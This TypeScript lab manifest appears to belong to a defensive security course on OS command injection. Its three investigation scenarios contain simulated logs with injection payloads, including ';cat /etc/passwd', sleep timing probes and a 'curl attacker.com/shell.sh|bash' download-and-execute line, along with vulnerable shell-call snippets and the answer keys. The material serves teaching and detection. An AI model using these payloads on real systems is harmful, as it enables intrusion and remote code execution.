import type { LabManifest } from "../../types/manifest";

export const commandInjectionPatternsLab: LabManifest = {
  schemaVersion: "1.1",
  id: "command-injection-patterns",
  version: 1,
  title: "Command Injection Attack Patterns",

  tier: "advanced",
  track: "vulnerability-hardening",
  difficulty: "challenging",
  accessLevel: "free",
  tags: ["command-injection", "os-injection", "rce", "web-security", "owasp", "shell"],

  description:
    "Identify OS command injection attack patterns in application logs, analyze injection techniques including time-based blind injection, and determine appropriate remediation steps for vulnerable endpoints.",
  estimatedMinutes: 12,
  learningObjectives: [
    "Recognize OS command injection attack patterns in web application logs",
    "Distinguish time-based blind injection from in-band command injection",
    "Identify vulnerable code patterns and apply appropriate remediation",
  ],
  sortOrder: 520,

  status: "published",
  prerequisites: [],

  rendererType: "investigate-decide",

  scenarios: [
    {
      type: "investigate-decide",
      id: "cmdinj-001",
      title: "Direct Command Injection via Network Diagnostics Tool",
      objective:
        "Application logs show unusual activity on the network diagnostics endpoint. Determine if an attack occurred and what was executed.",
      investigationData: [
        {
          id: "access-log",
          label: "Web Application Access Log",
          content:
            "POST /admin/network-diag HTTP/1.1 | Body: host=192.168.1.1;cat+/etc/passwd | Response: 200 | 127ms | User-Agent: curl/7.88.1 | Source: 203.0.113.5",
          isCritical: true,
        },
        {
          id: "app-output",
          label: "Application Response Body",
          content:
            "Response contains: PING output followed by full /etc/passwd contents including root:x:0:0:root:/root:/bin/bash, daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin, and 31 more entries.",
          isCritical: true,
        },
        {
          id: "code-review",
          label: "Vulnerable Code Snippet",
          content:
            "Python: result = subprocess.getoutput(f'ping -c 1 {user_input}') — The user-controlled 'host' parameter is passed directly to a shell command. The semicolon (;) allows chaining a second command.",
        },
        {
          id: "follow-up-requests",
          label: "Follow-Up Requests",
          content:
            "Three subsequent requests in 2 minutes: host=192.168.1.1;id, host=192.168.1.1;uname+-a, host=192.168.1.1;ls+/var/www — Attacker is performing post-exploitation enumeration.",
        },
      ],
      actions: [
        {
          id: "ISOLATE_PATCH_FORENSIC",
          label: "Isolate server, preserve logs, patch to use subprocess list args",
          color: "red",
        },
        {
          id: "BLOCK_IP",
          label: "Block the IP and keep server running",
          color: "orange",
        },
        {
          id: "PATCH_ONLY",
          label: "Patch the code only — IP may rotate",
          color: "yellow",
        },
        {
          id: "MONITOR",
          label: "Monitor for more requests before acting",
          color: "blue",
        },
      ],
      correctActionId: "ISOLATE_PATCH_FORENSIC",
      rationales: [
        {
          id: "rat-rce-confirmed",
          text: "The response body confirms successful /etc/passwd exfiltration and subsequent enumeration (id, uname, ls). This is an active RCE with confirmed post-exploitation activity. Server isolation prevents further damage, log preservation enables forensic analysis, and fixing subprocess to use list arguments eliminates the shell injection vector.",
        },
        {
          id: "rat-block-insufficient",
          text: "The attacker has already executed commands. Blocking the IP doesn't undo the exfiltration or prevent persistence mechanisms already installed.",
        },
        {
          id: "rat-patch-only",
          text: "Patching code without isolation leaves the server running while the attacker may have installed backdoors or established persistence.",
        },
        {
          id: "rat-monitor",
          text: "The attacker is already enumerating the system. Monitoring an active RCE allows them to establish persistence or pivot.",
        },
      ],
      correctRationaleId: "rat-rce-confirmed",
      feedback: {
        perfect: "Correct. /etc/passwd exfiltration plus follow-up enumeration confirms active exploitation. Isolate immediately to stop further damage, preserve logs for forensics, and patch subprocess to list args form which prevents shell interpretation entirely.",
        partial: "You identified the threat but your response is incomplete. Patching alone doesn't address post-exploitation activity. Blocking an IP doesn't undo commands already run.",
        wrong: "Monitoring an active RCE with confirmed file exfiltration is extremely risky. The attacker is enumerating the system — action is needed now.",
      },
    },
    {
      type: "investigate-decide",
      id: "cmdinj-002",
      title: "Time-Based Blind Command Injection",
      objective:
        "WAF flagged slow responses from a file conversion endpoint. Investigate whether this represents command injection.",
      investigationData: [
        {
          id: "timing-pattern",
          label: "Request Timing Analysis",
          content:
            "POST /api/convert | Filename parameter: report.pdf;sleep+5 → Response time: 5,031ms. Filename: report.pdf;sleep+10 → Response time: 10,044ms. Filename: report.pdf → Response time: 231ms. Timing directly correlates with sleep value.",
          isCritical: true,
        },
        {
          id: "response-check",
          label: "Response Content",
          content:
            "All responses return the same conversion result or error message — no command output visible. No files appear to have been exfiltrated based on egress monitoring. The injection is 'blind' — command output not reflected.",
        },
        {
          id: "code-snippet",
          label: "File Conversion Code",
          content:
            "Shell command: convert_cmd = f'libreoffice --headless --convert-to pdf {filename}' | os.system(convert_cmd). Filename comes from multipart form field without sanitization.",
        },
        {
          id: "subsequent-requests",
          label: "Requests After Timing Probes",
          content:
            "After confirming injection, 4 requests with: filename=report.pdf;curl+attacker.com/shell.sh|bash — Network egress logs show outbound connection to attacker.com:80 was blocked by firewall.",
          isCritical: true,
        },
      ],
      actions: [
        {
          id: "ISOLATE_INVESTIGATE",
          label: "Isolate server, check if curl succeeded before block, patch code",
          color: "red",
        },
        {
          id: "FIREWALL_SAVED",
          label: "Firewall blocked it — monitor and patch in next sprint",
          color: "yellow",
        },
        {
          id: "BLOCK_CONVERT_API",
          label: "Disable the convert API temporarily",
          color: "orange",
        },
        {
          id: "WAF_BLOCK",
          label: "Add WAF rule for sleep commands",
          color: "blue",
        },
      ],
      correctActionId: "ISOLATE_INVESTIGATE",
      rationales: [
        {
          id: "rat-blind-serious",
          text: "The timing correlation proves command injection. The firewall blocked the curl command visible in logs, but there may have been earlier successful exfiltration or other commands executed before the firewall block. Isolation enables forensic investigation of what actually ran. The code must be patched to use subprocess with a list argument (never shell=True with user input).",
        },
        {
          id: "rat-firewall-sufficient",
          text: "The firewall blocked the logged curl attempt, but the timing attack proves other commands may have run before. The injection vulnerability must be fixed — firewall egress is not a reliable compensating control for RCE.",
        },
        {
          id: "rat-disable-api",
          text: "Disabling the API is a valid temporary measure but doesn't address the forensic question of what may have already executed.",
        },
        {
          id: "rat-waf-sleep",
          text: "WAF rules for 'sleep' will generate massive false positives on filenames and legitimate text. They're easily bypassed with alternatives like 'ping -c 5 127.0.0.1'.",
        },
      ],
      correctRationaleId: "rat-blind-serious",
      feedback: {
        perfect: "Good analysis. The firewall blocked the visible curl attempt, but blind injection means other commands may have run undetected. Isolation + forensic review determines the full scope before declaring all-clear.",
        partial: "You recognized the threat but timing is critical. Even if the firewall blocked egress, the injection was proven — investigate what other commands may have run without network traffic.",
        wrong: "A proven time-based injection with attempted backdoor installation isn't resolved by WAF rules or next-sprint patching. Investigate the scope of what already ran.",
      },
    },
    {
      type: "investigate-decide",
      id: "cmdinj-003",
      title: "False Positive — Legitimate Filename with Special Characters",
      objective:
        "Security scan flagged a file upload endpoint for potential command injection. Verify the finding.",
      investigationData: [
        {
          id: "scan-finding",
          label: "DAST Scanner Finding",
          content:
            "Tool: OWASP ZAP | Severity: High | URL: POST /upload | Parameter: filename | Evidence: filename contains pipe character (|) in 'Q1-Revenue|Analysis.xlsx'",
        },
        {
          id: "code-review",
          label: "Code Implementation",
          content:
            "Python code: filename = secure_filename(request.files['file'].filename) then os.path.join(upload_dir, filename). secure_filename() strips all special characters including |, ;, &, $. Actual filename stored: Q1-RevenueAnalysis.xlsx",
        },
        {
          id: "test-result",
          label: "Manual Verification",
          content:
            "Tested: uploaded file with filename 'test;id.txt'. secure_filename() transforms it to 'testid.txt'. No shell metacharacters survive the sanitization. The filesystem operation uses the sanitized name only.",
        },
        {
          id: "timing-test",
          label: "Timing Test Result",
          content:
            "Uploaded filename='test;sleep 10.txt'. Response time: 245ms — consistent with normal upload time. No sleep effect observed. secure_filename() sanitization is effective.",
        },
      ],
      actions: [
        {
          id: "CLOSE_FP_DOCUMENT",
          label: "Close as false positive, document secure_filename() as control",
          color: "green",
        },
        {
          id: "PATCH_ANYWAY",
          label: "Patch the code anyway to use whitelist-only filenames",
          color: "yellow",
        },
        {
          id: "ESCALATE",
          label: "Escalate — scanner findings should always be validated by human",
          color: "orange",
        },
        {
          id: "BLOCK_SPECIAL_CHARS",
          label: "Add explicit block on | ; & $ characters at WAF",
          color: "blue",
        },
      ],
      correctActionId: "CLOSE_FP_DOCUMENT",
      rationales: [
        {
          id: "rat-fp-proven",
          text: "The code uses secure_filename() which strips all shell metacharacters before any filesystem operation. Manual timing tests confirm no command execution. The DAST scanner saw a pipe character in the raw input but didn't account for the sanitization layer. Documenting the control prevents future re-investigation of the same false positive.",
        },
        {
          id: "rat-patch-good-practice",
          text: "While a whitelist approach would be marginally more secure, it would change application behavior (limiting valid filenames) and the current control is verified effective. This is unnecessary work for a confirmed false positive.",
        },
        {
          id: "rat-escalate",
          text: "Human validation is exactly what was performed — the code review and timing tests prove the finding is a false positive. No further escalation is needed.",
        },
        {
          id: "rat-waf-redundant",
          text: "Adding a WAF rule for characters that are already stripped by the application provides no additional security and adds maintenance overhead.",
        },
      ],
      correctRationaleId: "rat-fp-proven",
      feedback: {
        perfect: "Correct. You validated the finding manually and the sanitization layer is effective. Documenting secure_filename() as a compensating control prevents this from being re-reported as a finding in future scans.",
        partial: "Your approach is cautious but adding controls on top of a confirmed false positive wastes engineering time without security benefit.",
        wrong: "The timing test and code review both confirm the scanner finding is a false positive. Manual validation of DAST findings is exactly the right approach — trust verified evidence over automated tool output.",
      },
    },
  ],

  hints: [
    "Time-based blind injection uses sleep/ping delays to confirm execution when command output isn't visible in responses.",
    "For command injection fixes, always use subprocess with a list argument (subprocess.run(['cmd', arg])) instead of shell=True with string formatting.",
    "DAST scanners generate false positives when they see metacharacters in input without accounting for server-side sanitization — always manually verify.",
  ],

  scoring: {
    maxScore: 100,
    hintPenalty: 5,
    penalties: { perfect: 0, partial: 10, wrong: 20 },
    passingThresholds: { pass: 80, partial: 50 },
  },

  careerInsight:
    "Command injection vulnerabilities in features like network diagnostics, file converters, and ping utilities are common in web applications. They represent the highest-severity OWASP category because they grant arbitrary code execution.",
  toolRelevance: [
    "Burp Suite (Intruder/Repeater)",
    "Commix (automated injection tester)",
    "OWASP ZAP",
    "Bandit (Python static analysis)",
  ],

  createdAt: "2026-03-27",
  updatedAt: "2026-03-27",
};
